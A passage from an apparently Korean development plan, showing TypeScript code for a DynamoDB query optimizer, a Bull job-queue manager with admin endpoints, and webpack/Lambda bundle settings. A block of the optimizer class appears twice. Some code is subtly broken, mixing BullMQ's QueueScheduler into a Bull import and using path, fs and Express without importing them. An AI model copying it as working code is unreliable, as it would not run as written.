    } = {}
  ): AsyncGenerator<T[], void, unknown> {
    let lastEvaluatedKey: Record<string, any> | undefined;
    let totalItems = 0;
    const startTime = Date.now();
    
    do {
      const params: any = {
        TableName: tableName,
        KeyConditionExpression: keyConditionExpression,
        ExpressionAttributeValues: expressionAttributeValues,
        Limit: options.limit || 100,
        ExclusiveStartKey: lastEvaluatedKey
      };
      
      // 옵션 추가
      if (options.indexName) params.IndexName = options.indexName;
      if (options.projectionExpression) params.ProjectionExpression = options.projectionExpression;
      if (options.filterExpression) params.FilterExpression = options.filterExpression;
      if (options.scanIndexForward !== undefined) params.ScanIndexForward = options.scanIndexForward;
      
      try {
        const response = await this.docClient.send(new QueryCommand(params));
        
        if (response.Items && response.Items.length > 0) {
          totalItems += response.Items.length;
          yield response.Items as T[];
        }
        
        lastEvaluatedKey = response.LastEvaluatedKey;
        
        // 소비된 용량 기록
        if (response.ConsumedCapacity) {
          this.recordConsumedCapacity(tableName, response.ConsumedCapacity);
        }
        
      } catch (error) {
        logger.error(`Query error for table ${tableName}:`, error);
        throw error;
      }
      
    } while (lastEvaluatedKey);
    
    // 전체 쿼리 메트릭 기록
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'paginatedQuery',
      table: tableName,
      duration,
      itemCount: totalItems,
      retryCount: 0
    });
  }
  
  // 병렬 쿼리 실행
  async parallelQueries<T>(
    queries: Array<{
      table: string;
      keyCondition: string;
      values: Record<string, any>;
      options?: any;
    }>
  ): Promise<T[][]> {
    const startTime = Date.now();
    
    const promises = queries.map(async (query) => {
      const items: T[] = [];
      
      for await (const batch of this.paginatedQuery<T>(
        query.table,
        query.keyCondition,
        query.values,
        query.options
      )) {
        items.push(...batch);
      }
      
      return items;
    });
    
    const results = await Promise.all(promises);
    
    // 메트릭 기록
    const duration = Date.now() - startTime;
    const totalItems = results.reduce((sum, items) => sum + items.length, 0);
    
    this.recordQueryMetrics({
      operation: 'parallelQueries',
      table: 'multiple',
      duration,
      itemCount: totalItems,
      retryCount: 0
    });
    
    return results;
  }
  
  // 인덱스 프로젝션 최적화
  optimizeProjection(
    requiredAttributes: string[],
    indexProjections: Record<string, string[]>
  ): { indexName?: string; projectionExpression?: string } {
    // 필요한 속성을 모두 포함하는 가장 작은 인덱스 찾기
    let bestIndex: string | undefined;
    let minExtraAttributes = Infinity;
    
    for (const [indexName, projectedAttributes] of Object.entries(indexProjections)) {
      const missingAttributes = requiredAttributes.filter(
        attr => !projectedAttributes.includes(attr)
      );
      
      if (missingAttributes.length === 0) {
        // 모든 속성을 포함하는 인덱스 발견
        const extraAttributes = projectedAttributes.length - requiredAttributes.length;
        if (extraAttributes < minExtraAttributes) {
          bestIndex = indexName;
          minExtraAttributes = extraAttributes;
        }
      }
    }
    
    return {
      indexName: bestIndex,
      projectionExpression: requiredAttributes.join(', ')
    };
  }
  
  // 조건부 쓰기 최적화
  async conditionalWrite(
    tableName: string,
    key: Record<string, any>,
    updateExpression: string,
    conditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    retryOptions = { maxRetries: 3, baseDelay: 100 }
  ): Promise<void> {
    let retryCount = 0;
    
    while (retryCount <= retryOptions.maxRetries) {
      try {
        await this.docClient.send(new UpdateCommand({
          TableName: tableName,
          Key: key,
          UpdateExpression: updateExpression,
          ConditionExpression: conditionExpression,
          ExpressionAttributeValues: expressionAttributeValues,
          ReturnConsumedCapacity: 'TOTAL'
        }));
        
        // 성공하면 캐시 무효화
        const cacheKey = this.generateCacheKey(tableName, key);
        this.invalidateCache(cacheKey);
        
        return;
        
      } catch (error: any) {
        if (error.name === 'ConditionalCheckFailedException') {
          if (retryCount < retryOptions.maxRetries) {
            // 조건 확인 실패 시 재시도
            await this.exponentialBackoff(retryCount, retryOptions.baseDelay);
            retryCount++;
          } else {
            throw error;
          }
        } else {
          throw error;
        }
      }
    }
  }
  
  // 헬퍼 메서드들
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  private async exponentialBackoff(retryCount: number, baseDelay: number = 100): Promise<void> {
    const delay = baseDelay * Math.pow(2, retryCount) + Math.random() * 100;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateCacheKey(tableName: string, key: Record<string, any>): string {
    return `${tableName}:${JSON.stringify(key)}`;
  }
  
  private getFromCache(key: string): any {
    const cached = this.queryCache.get(key);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return cached.data;
    }
    return null;
  }
  
  private setCache(key: string, data: any): void {
    this.queryCache.set(key, {
      data,
      timestamp: Date.now()
    });
  }
  
  private invalidateCache(key: string): void {
    this.queryCache.delete(key);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [key, value] of this.queryCache.entries()) {
      if (now - value.timestamp > this.CACHE_TTL) {
        this.queryCache.delete(key);
      }
    }
  }
  
  private extractKey(tableName: string, item: any): Record<string, any> {
    // 테이블별 키 추출 로직
    return { id: item.id };
  }
  
  private async handleUnprocessedKeys<T>(
    tableName: string,
    unprocessedKeys: Array<Record<string, any>>,
    results: T[]
  ): Promise<void> {
    const retryResults = await this.batchGet<T>(tableName, unprocessedKeys);
    results.push(...retryResults);
  }
  
  private recordQueryMetrics(metrics: QueryMetrics): void {
    MetricsHelper.recordDatabaseOperation(
      metrics.operation,
      metrics.table,
      metrics.duration,
      metrics.itemCount
    );
    
    logger.debug('Query metrics:', metrics);
  }
  
  private recordConsumedCapacity(tableName: string, capacity: any): void {
    if (capacity.CapacityUnits) {
      MetricsHelper.recordConsumedCapacity(
        tableName,
        capacity.CapacityUnits
      );
    }
  }
}

// 쿼리 빌더 헬퍼
export class DynamoQueryBuilder {
  private keyConditions: string[] = [];
  private filterConditions: string[] = [];
  private attributeValues: Record<string, any> = {};
  private attributeNames: Record<string, string> = {};
  private projectionAttributes: string[] = [];
  
  key(attribute: string, operator: '=' | '<' | '<=' | '>' | '>=' | 'BETWEEN' | 'begins_with', value: any): this {
    const placeholder = `:${attribute}`;
    
    switch (operator) {
      case '=':
        this.keyConditions.push(`${attribute} = ${placeholder}`);
        this.attributeValues[placeholder] = value;
        break;
      case 'BETWEEN':
        this.keyConditions.push(`${attribute} BETWEEN ${placeholder}1 AND ${placeholder}2`);
        this.attributeValues[`${placeholder}1`] = value[0];
        this.attributeValues[`${placeholder}2`] = value[1];
        break;
      case 'begins_with':
        this.keyConditions.push(`begins_with(${attribute}, ${placeholder})`);
        this.attributeValues[placeholder] = value;
        break;
      default:
        this.keyConditions.push(`${attribute} ${operator} ${placeholder}`);
        this.attributeValues[placeholder] = value;
    }
    
    return this;
  }
  
  filter(attribute: string, operator: string, value: any): this {
    const placeholder = `:filter${Object.keys(this.attributeValues).length}`;
    this.filterConditions.push(`${attribute} ${operator} ${placeholder}`);
    this.attributeValues[placeholder] = value;
    return this;
  }
  
  project(...attributes: string[]): this {
    this.projectionAttributes.push(...attributes);
    return this;
  }
  
  build(): {
    KeyConditionExpression: string;
    FilterExpression?: string;
    ProjectionExpression?: string;
    ExpressionAttributeValues: Record<string, any>;
    ExpressionAttributeNames?: Record<string, string>;
  } {
    const result: any = {
      KeyConditionExpression: this.keyConditions.join(' AND '),
      ExpressionAttributeValues: this.attributeValues
    };
    
    if (this.filterConditions.length > 0) {
      result.FilterExpression = this.filterConditions.join(' AND ');
    }
    
    if (this.projectionAttributes.length > 0) {
      result.ProjectionExpression = this.projectionAttributes.join(', ');
    }
    
    if (Object.keys(this.attributeNames).length > 0) {
      result.ExpressionAttributeNames = this.attributeNames;
    }
    
    return result;
  }
}

**🔧 사용자 작업**:
- QueryOptimizer를 DynamoDB 클라이언트에 통합
- 캐시 TTL 및 크기 제한 설정
- 테이블별 키 추출 로직 구현
- 성능 메트릭 모니터링 설정

---
        const extraAttributes = projectedAttributes.length - requiredAttributes.length;
        if (extraAttributes < minExtraAttributes) {
          bestIndex = indexName;
          minExtraAttributes = extraAttributes;
        }
      }
    }
    
    return {
      indexName: bestIndex,
      projectionExpression: requiredAttributes.join(', ')
    };
  }
  
  // 조건부 쓰기 최적화
  async conditionalWrite(
    tableName: string,
    key: Record<string, any>,
    updateExpression: string,
    conditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    retryOptions = { maxRetries: 3, baseDelay: 100 }
  ): Promise<void> {
    let retryCount = 0;
    
    while (retryCount <= retryOptions.maxRetries) {
      try {
        await this.docClient.send(new UpdateCommand({
          TableName: tableName,
          Key: key,
          UpdateExpression: updateExpression,
          ConditionExpression: conditionExpression,
          ExpressionAttributeValues: expressionAttributeValues,
          ReturnConsumedCapacity: 'TOTAL'
        }));
        
        // 성공하면 캐시 무효화
        const cacheKey = this.generateCacheKey(tableName, key);
        this.invalidateCache(cacheKey);
        
        return;
        
      } catch (error: any) {
        if (error.name === 'ConditionalCheckFailedException') {
          if (retryCount < retryOptions.maxRetries) {
            // 조건 확인 실패 시 재시도
            await this.exponentialBackoff(retryCount, retryOptions.baseDelay);
            retryCount++;
          } else {
            throw error;
          }
        } else {
          throw error;
        }
      }
    }
  }
  
  // 헬퍼 메서드들
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  private async exponentialBackoff(retryCount: number, baseDelay: number = 100): Promise<void> {
    const delay = baseDelay * Math.pow(2, retryCount) + Math.random() * 100;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateCacheKey(tableName: string, key: Record<string, any>): string {
    return `${tableName}:${JSON.stringify(key)}`;
  }
  
  private getFromCache(key: string): any {
    const cached = this.queryCache.get(key);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return cached.data;
    }
    return null;
  }
  
  private setCache(key: string, data: any): void {
    this.queryCache.set(key, {
      data,
      timestamp: Date.now()
    });
  }
  
  private invalidateCache(key: string): void {
    this.queryCache.delete(key);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [key, value] of this.queryCache.entries()) {
      if (now - value.timestamp > this.CACHE_TTL) {
        this.queryCache.delete(key);
      }
    }
  }
  
  private extractKey(tableName: string, item: any): Record<string, any> {
    // 테이블별 키 추출 로직
    // 실제 구현에서는 테이블 스키마에 따라 다름
    return { id: item.id };
  }
  
  private async handleUnprocessedKeys<T>(
    tableName: string,
    unprocessedKeys: Array<Record<string, any>>,
    results: T[]
  ): Promise<void> {
    // 재시도 로직
    await this.batchGet(tableName, unprocessedKeys);
  }
  
  private recordQueryMetrics(metrics: QueryMetrics): void {
    // 메트릭 기록
    MetricsHelper.recordDatabaseOperation(
      metrics.operation,
      metrics.table,
      metrics.duration,
      metrics.itemCount
    );
    
    logger.debug('Query metrics:', metrics);
  }
  
  private recordConsumedCapacity(tableName: string, capacity: any): void {
    if (capacity.CapacityUnits) {
      MetricsHelper.recordConsumedCapacity(
        tableName,
        capacity.CapacityUnits
      );
    }
  }
}

// 쿼리 빌더 헬퍼
export class DynamoQueryBuilder {
  private keyConditions: string[] = [];
  private filterConditions: string[] = [];
  private attributeValues: Record<string, any> = {};
  private attributeNames: Record<string, string> = {};
  private projectionAttributes: string[] = [];
  
  key(attribute: string, operator: '=' | '<' | '<=' | '>' | '>=' | 'BETWEEN' | 'begins_with', value: any): this {
    const placeholder = `:${attribute}`;
    
    switch (operator) {
      case '=':
        this.keyConditions.push(`${attribute} = ${placeholder}`);
        this.attributeValues[placeholder] = value;
        break;
      case 'BETWEEN':
        this.keyConditions.push(`${attribute} BETWEEN ${placeholder}1 AND ${placeholder}2`);
        this.attributeValues[`${placeholder}1`] = value[0];
        this.attributeValues[`${placeholder}2`] = value[1];
        break;
      case 'begins_with':
        this.keyConditions.push(`begins_with(${attribute}, ${placeholder})`);
        this.attributeValues[placeholder] = value;
        break;
      default:
        this.keyConditions.push(`${attribute} ${operator} ${placeholder}`);
        this.attributeValues[placeholder] = value;
    }
    
    return this;
  }
  
  filter(attribute: string, operator: string, value: any): this {
    const placeholder = `:filter${Object.keys(this.attributeValues).length}`;
    this.filterConditions.push(`${attribute} ${operator} ${placeholder}`);
    this.attributeValues[placeholder] = value;
    return this;
  }
  
  project(...attributes: string[]): this {
    this.projectionAttributes.push(...attributes);
    return this;
  }
  
  build(): {
    KeyConditionExpression: string;
    FilterExpression?: string;
    ProjectionExpression?: string;
    ExpressionAttributeValues: Record<string, any>;
    ExpressionAttributeNames?: Record<string, string>;
  } {
    const result: any = {
      KeyConditionExpression: this.keyConditions.join(' AND '),
      ExpressionAttributeValues: this.attributeValues
    };
    
    if (this.filterConditions.length > 0) {
      result.FilterExpression = this.filterConditions.join(' AND ');
    }
    
    if (this.projectionAttributes.length > 0) {
      result.ProjectionExpression = this.projectionAttributes.join(', ');
    }
    
    if (Object.keys(this.attributeNames).length > 0) {
      result.ExpressionAttributeNames = this.attributeNames;
    }
    
    return result;
  }
}
```

### SubTask 0.11.3: 비동기 작업 큐 시스템
**목표**: 백그라운드 작업 처리를 위한 큐 시스템 구축

**구현 내용**:
```typescript
// backend/src/performance/job-queue.ts
import Bull, { Queue, Job, JobOptions, WorkerOptions, QueueScheduler } from 'bull';
import { logger } from '../config/logger';
import { MetricsHelper } from '../config/metrics';
import Redis from 'ioredis';

// 작업 타입 정의
export enum JobType {
  AGENT_EXECUTION = 'agent_execution',
  PROJECT_BUILD = 'project_build',
  COMPONENT_GENERATION = 'component_generation',
  EMAIL_NOTIFICATION = 'email_notification',
  REPORT_GENERATION = 'report_generation',
  CACHE_WARMING = 'cache_warming',
  DATA_EXPORT = 'data_export',
  CLEANUP = 'cleanup'
}

// 작업 우선순위
export enum JobPriority {
  CRITICAL = 1,
  HIGH = 2,
  NORMAL = 3,
  LOW = 4
}

// 작업 데이터 인터페이스
interface BaseJobData {
  type: JobType;
  userId?: string;
  projectId?: string;
  timestamp: number;
}

interface AgentExecutionJob extends BaseJobData {
  type: JobType.AGENT_EXECUTION;
  agentName: string;
  input: any;
}

interface ProjectBuildJob extends BaseJobData {
  type: JobType.PROJECT_BUILD;
  projectConfig: any;
}

export type JobData = AgentExecutionJob | ProjectBuildJob;

// 큐 매니저
export class QueueManager {
  private queues: Map<string, Queue> = new Map();
  private schedulers: Map<string, QueueScheduler> = new Map();
  private redisConnection: Redis;
  
  constructor() {
    this.redisConnection = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      maxRetriesPerRequest: null
    });
  }
  
  // 큐 초기화
  async initialize(): Promise<void> {
    // 메인 작업 큐
    await this.createQueue('main', {
      defaultJobOptions: {
        removeOnComplete: 100,
        removeOnFail: 1000,
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 2000
        }
      }
    });
    
    // 우선순위 큐
    await this.createQueue('priority', {
      defaultJobOptions: {
        removeOnComplete: 50,
        removeOnFail: 500,
        attempts: 5
      }
    });
    
    // 배치 작업 큐
    await this.createQueue('batch', {
      defaultJobOptions: {
        removeOnComplete: true,
        removeOnFail: false,
        attempts: 1
      }
    });
    
    // 스케줄 작업 큐
    await this.createQueue('scheduled', {
      defaultJobOptions: {
        removeOnComplete: true,
        attempts: 3
      }
    });
    
    logger.info('Job queues initialized');
  }
  
  // 큐 생성
  private async createQueue(name: string, options?: any): Promise<Queue> {
    const queue = new Bull(name, {
      redis: {
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT || '6379'),
        password: process.env.REDIS_PASSWORD
      },
      ...options
    });
    
    // 큐 스케줄러 생성 (지연 작업 지원)
    const scheduler = new QueueScheduler(name, {
      connection: this.redisConnection
    });
    
    this.queues.set(name, queue);
    this.schedulers.set(name, scheduler);
    
    // 큐 이벤트 리스너
    this.setupQueueEventListeners(queue, name);
    
    return queue;
  }
  
  // 작업 추가
  async addJob(
    queueName: string,
    jobName: string,
    data: JobData,
    options?: JobOptions
  ): Promise<Job> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const jobOptions: JobOptions = {
      ...options,
      priority: this.getJobPriority(data.type)
    };
    
    const job = await queue.add(jobName, data, jobOptions);
    
    logger.info(`Job added to queue ${queueName}:`, {
      jobId: job.id,
      jobName,
      type: data.type
    });
    
    // 메트릭 기록
    MetricsHelper.recordJobQueued(queueName, jobName);
    
    return job;
  }
  
  // 배치 작업 추가
  async addBulkJobs(
    queueName: string,
    jobs: Array<{ name: string; data: JobData; opts?: JobOptions }>
  ): Promise<Job[]> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const bulkJobs = jobs.map(job => ({
      name: job.name,
      data: job.data,
      opts: {
        ...job.opts,
        priority: this.getJobPriority(job.data.type)
      }
    }));
    
    const addedJobs = await queue.addBulk(bulkJobs);
    
    logger.info(`${jobs.length} jobs added to queue ${queueName}`);
    
    // 메트릭 기록
    MetricsHelper.recordBulkJobsQueued(queueName, jobs.length);
    
    return addedJobs;
  }
  
  // 스케줄 작업 추가
  async scheduleJob(
    queueName: string,
    jobName: string,
    data: JobData,
    cronExpression: string,
    options?: JobOptions
  ): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.add(jobName, data, {
      ...options,
      repeat: {
        cron: cronExpression,
        tz: 'UTC'
      }
    });
    
    logger.info(`Scheduled job added to queue ${queueName}:`, {
      jobName,
      cron: cronExpression
    });
  }
  
  // 지연 작업 추가
  async addDelayedJob(
    queueName: string,
    jobName: string,
    data: JobData,
    delayMs: number,
    options?: JobOptions
  ): Promise<Job> {
    return this.addJob(queueName, jobName, data, {
      ...options,
      delay: delayMs
    });
  }
  
  // 작업 상태 조회
  async getJobStatus(queueName: string, jobId: string): Promise<any> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const job = await queue.getJob(jobId);
    if (!job) {
      return null;
    }
    
    const state = await job.getState();
    const progress = job.progress();
    
    return {
      id: job.id,
      name: job.name,
      data: job.data,
      state,
      progress,
      attemptsMade: job.attemptsMade,
      processedOn: job.processedOn,
      finishedOn: job.finishedOn,
      failedReason: job.failedReason
    };
  }
  
  // 큐 상태 조회
  async getQueueStats(queueName: string): Promise<any> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const [
      waitingCount,
      activeCount,
      completedCount,
      failedCount,
      delayedCount,
      pausedCount
    ] = await Promise.all([
      queue.getWaitingCount(),
      queue.getActiveCount(),
      queue.getCompletedCount(),
      queue.getFailedCount(),
      queue.getDelayedCount(),
      queue.isPaused()
    ]);
    
    return {
      name: queueName,
      counts: {
        waiting: waitingCount,
        active: activeCount,
        completed: completedCount,
        failed: failedCount,
        delayed: delayedCount
      },
      isPaused: pausedCount
    };
  }
  
  // 큐 일시정지/재개
  async pauseQueue(queueName: string): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.pause();
    logger.info(`Queue ${queueName} paused`);
  }
  
  async resumeQueue(queueName: string): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.resume();
    logger.info(`Queue ${queueName} resumed`);
  }
  
  // 큐 정리
  async cleanQueue(queueName: string, grace: number = 5000): Promise<void> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    await queue.clean(grace, 'completed');
    await queue.clean(grace, 'failed');
    
    logger.info(`Queue ${queueName} cleaned`);
  }
  
  // 실패한 작업 재시도
  async retryFailedJobs(queueName: string): Promise<number> {
    const queue = this.queues.get(queueName);
    if (!queue) {
      throw new Error(`Queue ${queueName} not found`);
    }
    
    const failedJobs = await queue.getFailed();
    let retryCount = 0;
    
    for (const job of failedJobs) {
      if (job.attemptsMade < (job.opts.attempts || 3)) {
        await job.retry();
        retryCount++;
      }
    }
    
    logger.info(`Retried ${retryCount} failed jobs in queue ${queueName}`);
    
    return retryCount;
  }
  
  // 큐 이벤트 리스너 설정
  private setupQueueEventListeners(queue: Queue, name: string): void {
    queue.on('completed', (job, result) => {
      logger.debug(`Job completed in queue ${name}:`, {
        jobId: job.id,
        duration: Date.now() - job.timestamp
      });
      
      MetricsHelper.recordJobCompleted(name, job.name, Date.now() - job.timestamp);
    });
    
    queue.on('failed', (job, err) => {
      logger.error(`Job failed in queue ${name}:`, {
        jobId: job.id,
        error: err.message,
        attempts: job.attemptsMade
      });
      
      MetricsHelper.recordJobFailed(name, job.name);
    });
    
    queue.on('stalled', (job) => {
      logger.warn(`Job stalled in queue ${name}:`, {
        jobId: job.id
      });
    });
    
    queue.on('progress', (job, progress) => {
      logger.debug(`Job progress in queue ${name}:`, {
        jobId: job.id,
        progress
      });
    });
  }
  
  // 작업 우선순위 결정
  private getJobPriority(jobType: JobType): number {
    const priorityMap: Record<JobType, JobPriority> = {
      [JobType.AGENT_EXECUTION]: JobPriority.HIGH,
      [JobType.PROJECT_BUILD]: JobPriority.HIGH,
      [JobType.COMPONENT_GENERATION]: JobPriority.NORMAL,
      [JobType.EMAIL_NOTIFICATION]: JobPriority.NORMAL,
      [JobType.REPORT_GENERATION]: JobPriority.LOW,
      [JobType.CACHE_WARMING]: JobPriority.LOW,
      [JobType.DATA_EXPORT]: JobPriority.NORMAL,
      [JobType.CLEANUP]: JobPriority.LOW
    };
    
    return priorityMap[jobType] || JobPriority.NORMAL;
  }
  
  // 종료 처리
  async shutdown(): Promise<void> {
    logger.info('Shutting down job queues...');
    
    // 모든 큐 종료
    for (const [name, queue] of this.queues) {
      await queue.close();
      logger.info(`Queue ${name} closed`);
    }
    
    // 스케줄러 종료
    for (const [name, scheduler] of this.schedulers) {
      await scheduler.close();
      logger.info(`Scheduler ${name} closed`);
    }
    
    // Redis 연결 종료
    await this.redisConnection.quit();
    
    logger.info('Job queues shutdown complete');
  }
}

// Job Worker 베이스 클래스
export abstract class JobWorker {
  protected queue: Queue;
  protected concurrency: number;
  
  constructor(queue: Queue, concurrency: number = 1) {
    this.queue = queue;
    this.concurrency = concurrency;
  }
  
  // 워커 시작
  async start(): Promise<void> {
    this.queue.process(this.concurrency, async (job: Job) => {
      const startTime = Date.now();
      
      try {
        logger.info(`Processing job ${job.id} of type ${job.name}`);
        
        // 진행률 업데이트
        await job.progress(0);
        
        // 실제 작업 처리
        const result = await this.process(job);
        
        // 완료 진행률
        await job.progress(100);
        
        const duration = Date.now() - startTime;
        logger.info(`Job ${job.id} completed in ${duration}ms`);
        
        return result;
        
      } catch (error) {
        logger.error(`Job ${job.id} failed:`, error);
        throw error;
      }
    });
  }
  
  // 추상 메서드: 실제 작업 처리
  abstract process(job: Job): Promise<any>;
}

// 에이전트 실행 워커 예시
export class AgentExecutionWorker extends JobWorker {
  async process(job: Job<AgentExecutionJob>): Promise<any> {
    const { agentName, input } = job.data;
    
    // 진행률 업데이트
    await job.progress(10);
    
    // 에이전트 초기화
    const agent = await this.initializeAgent(agentName);
    await job.progress(30);
    
    // 에이전트 실행
    const result = await agent.execute(input);
    await job.progress(90);
    
    // 결과 저장
    await this.saveResult(job.data.projectId!, result);
    
    return result;
  }
  
  private async initializeAgent(agentName: string): Promise<any> {
    // 에이전트 초기화 로직
    return {};
  }
  
  private async saveResult(projectId: string, result: any): Promise<void> {
    // 결과 저장 로직
  }
}

// 큐 관리 API 엔드포인트
export function setupQueueManagementEndpoints(app: Express, queueManager: QueueManager): void {
  // 큐 상태 조회
  app.get('/api/admin/queues/:name/stats', async (req, res) => {
    try {
      const stats = await queueManager.getQueueStats(req.params.name);
      res.json(stats);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 작업 상태 조회
  app.get('/api/admin/queues/:name/jobs/:id', async (req, res) => {
    try {
      const status = await queueManager.getJobStatus(req.params.name, req.params.id);
      res.json(status);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 큐 일시정지
  app.post('/api/admin/queues/:name/pause', async (req, res) => {
    try {
      await queueManager.pauseQueue(req.params.name);
      res.json({ success: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 큐 재개
  app.post('/api/admin/queues/:name/resume', async (req, res) => {
    try {
      await queueManager.resumeQueue(req.params.name);
      res.json({ success: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
  
  // 실패한 작업 재시도
  app.post('/api/admin/queues/:name/retry-failed', async (req, res) => {
    try {
      const count = await queueManager.retryFailedJobs(req.params.name);
      res.json({ retriedJobs: count });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });
}
```
---

### SubTask 0.11.4: 코드 스플리팅 및 번들 최적화
**목표**: 프론트엔드 및 백엔드 코드 번들 최적화

**구현 내용**:
```typescript
// backend/src/performance/bundle-optimizer.ts
import webpack from 'webpack';
import TerserPlugin from 'terser-webpack-plugin';
import CompressionPlugin from 'compression-webpack-plugin';
import { BundleAnalyzerPlugin } from 'webpack-bundle-analyzer';
import nodeExternals from 'webpack-node-externals';

// 백엔드 번들 최적화 설정
export const backendWebpackConfig: webpack.Configuration = {
  mode: process.env.NODE_ENV === 'production' ? 'production' : 'development',
  target: 'node',
  entry: {
    main: './src/main.ts',
    // 에이전트별 엔트리 포인트
    'agents/nl-input': './src/agents/nl-input-agent.ts',
    'agents/ui-selection': './src/agents/ui-selection-agent.ts',
    'agents/parsing': './src/agents/parsing-agent.ts',
    'agents/component-decision': './src/agents/component-decision-agent.ts',
    'agents/matching-rate': './src/agents/matching-rate-agent.ts',
    'agents/search': './src/agents/search-agent.ts',
    'agents/generation': './src/agents/generation-agent.ts',
    'agents/assembly': './src/agents/assembly-agent.ts',
    'agents/download': './src/agents/download-agent.ts'
  },
  output: {
    path: path.resolve(__dirname, '../../dist'),
    filename: '[name].js',
    libraryTarget: 'commonjs2'
  },
  externals: [nodeExternals()],
  module: {
    rules: [
      {
        test: /\.ts$/,
        use: 'ts-loader',
        exclude: /node_modules/
      }
    ]
  },
  resolve: {
    extensions: ['.ts', '.js'],
    alias: {
      '@': path.resolve(__dirname, '../src')
    }
  },
  optimization: {
    minimize: process.env.NODE_ENV === 'production',
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          keep_classnames: true,
          keep_fnames: true
        }
      })
    ],
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        commons: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'initial'
        },
        shared: {
          test: /[\\/]src[\\/]shared[\\/]/,
          name: 'shared',
          chunks: 'all',
          minSize: 0
        }
      }
    }
  },
  plugins: [
    new webpack.DefinePlugin({
      'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV)
    }),
    new CompressionPlugin({
      algorithm: 'gzip',
      test: /\.(js|ts)$/,
      threshold: 10240,
      minRatio: 0.8
    }),
    ...(process.env.ANALYZE === 'true' ? [
      new BundleAnalyzerPlugin({
        analyzerMode: 'static',
        reportFilename: 'bundle-report.html'
      })
    ] : [])
  ]
};

// Lambda 함수 최적화 설정
export class LambdaOptimizer {
  private functionConfigs: Map<string, webpack.Configuration> = new Map();
  
  // Lambda 함수별 최적화 설정 생성
  createLambdaConfig(functionName: string, entryPoint: string): webpack.Configuration {
    return {
      mode: 'production',
      target: 'node18',
      entry: entryPoint,
      output: {
        path: path.resolve(__dirname, `../../dist/lambda/${functionName}`),
        filename: 'index.js',
        libraryTarget: 'commonjs2'
      },
      externals: [
        // AWS SDK는 Lambda 런타임에 포함되어 있음
        /^@aws-sdk/,
        // 무거운 의존성은 Layer로 분리
        'sharp',
        'puppeteer',
        'canvas'
      ],
      optimization: {
        minimize: true,
        minimizer: [
          new TerserPlugin({
            terserOptions: {
              compress: {
                drop_console: true,
                drop_debugger: true,
                pure_funcs: ['console.log', 'console.info']
              },
              mangle: {
                reserved: ['handler', 'exports']
              },
              output: {
                comments: false
              }
            }
          })
        ],
        // Tree shaking 최적화
        usedExports: true,
        sideEffects: false
      },
      resolve: {
        extensions: ['.ts', '.js']
      },
      module: {
        rules: [
          {
            test: /\.ts$/,
            use: [
              {
                loader: 'ts-loader',
                options: {
                  transpileOnly: true,
                  compilerOptions: {
                    target: 'ES2022'
                  }
                }
              }
            ]
          }
        ]
      },
      plugins: [
        // 번들 크기 제한 (Lambda 제한: 50MB zipped)
        new webpack.optimize.LimitChunkCountPlugin({
          maxChunks: 1
        }),
        // 환경 변수 주입
        new webpack.EnvironmentPlugin({
          NODE_ENV: 'production',
          AWS_REGION: 'us-east-1'
        })
      ]
    };
  }
  
  // 모든 Lambda 함수 빌드
  async buildAllFunctions(): Promise<void> {
    const functions = [
      { name: 'nl-processor', entry: './src/lambda/nl-processor.ts' },
      { name: 'code-generator', entry: './src/lambda/code-generator.ts' },
      { name: 'component-searcher', entry: './src/lambda/component-searcher.ts' }
    ];
    
    for (const func of functions) {
      const config = this.createLambdaConfig(func.name, func.entry);
      await this.buildFunction(config);
      
      // 번들 크기 검증
      await this.validateBundleSize(func.name);
    }
  }
  
  private async buildFunction(config: webpack.Configuration): Promise<void> {
    return new Promise((resolve, reject) => {
      webpack(config, (err, stats) => {
        if (err || stats?.hasErrors()) {
          reject(err || new Error('Build failed'));
          return;
        }
        
        console.log(stats?.toString({
          colors: true,
          modules: false,
          children: false
        }));
        
        resolve();
      });
    });
  }
  
  private async validateBundleSize(functionName: string): Promise<void> {
    const bundlePath = path.resolve(__dirname, `../../dist/lambda/${functionName}/index.js`);
    const stats = await fs.stat(bundlePath);
